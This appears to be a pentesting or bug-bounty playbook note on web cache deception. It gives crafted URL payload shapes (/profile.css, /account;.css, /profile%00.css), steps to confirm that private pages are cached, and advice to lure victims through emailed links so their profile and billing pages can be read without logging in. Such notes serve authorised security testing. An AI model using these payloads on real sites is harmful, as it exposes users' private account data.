# Cache Deception (deep)

Make the cache store a private page under a public URL.

---

## Preconditions

- The cache stores by extension or by path prefix.
- The origin ignores the extra path segment.
- The victim visits your crafted URL.

---

## Payload shapes

```
/profile.css          /profile/..%2fprofile
/account;.css         /settings%20.css
/api/me.json          /billing/x.js
/profile?x=.css       /profile/.css
```

---

## Confirm

1. Request `/profile.css` with a session → 200 with profile content.
2. Check `X-Cache: Miss` then `Hit` on the second request.
3. Request it with no session → still the profile content (poisoned).

---

## Variants

- **Extension append**: `/profile.css` where the router ignores `.css`.
- **Path append**: `/profile/anything.css`.
- **Delimiter**: `/profile;.css`, `/profile%00.css`.
- **Query**: `/profile?cb=.css` if the cache keys the query but the app ignores it.

---

## Impact

Read `/profile`, `/billing`, `/api/me`, `/settings` unauthenticated after the victim visits.

---

## Go deeper

1. Map cached extensions first (`.css`, `.js`, `.png`, `.ico`, `.woff`).
2. Test the API host — JSON responses are often cached by extension.
3. Test with `Cache-Control: no-store` pages (some caches ignore it).
4. Chain with a link the victim will click (email, chat).

---

## Related

- `00-core/impact-proof.md`
- `06-advanced/exploit-chaining.md`
- `08-validation/report-writing.md`
